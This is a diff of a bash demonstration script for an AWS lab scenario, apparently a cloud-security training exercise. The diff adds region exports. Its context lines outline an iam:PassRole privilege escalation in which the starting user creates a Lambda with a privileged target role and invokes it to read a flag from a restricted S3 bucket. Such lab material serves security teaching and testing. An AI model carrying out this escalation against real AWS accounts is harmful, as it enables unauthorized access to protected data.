@@ -122,6 +122,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -140,6 +141,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -149,6 +151,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have access to the target bucket yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list target bucket contents (should fail)..."
 show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
 if aws s3 ls "s3://$TARGET_BUCKET/" --region "$AWS_REGION" &> /dev/null; then
@@ -200,6 +203,7 @@ echo -e "${GREEN}✓ Lambda function payload prepared${NC}\n"
 echo -e "${YELLOW}Step 6: Creating Lambda function with target role (PassRole escalation)${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector — passing the target role to Lambda..."
 TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
@@ -238,6 +242,7 @@ echo -e "${GREEN}✓ Lambda function ready${NC}\n"
 echo -e "${YELLOW}Step 8: Invoking Lambda function to read flag from target S3 bucket${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Invoking function: $LAMBDA_FUNCTION_NAME"
 
 show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $LAMBDA_FUNCTION_NAME --payload '{}' /tmp/lambda-001-to-bucket-response.json --output json"
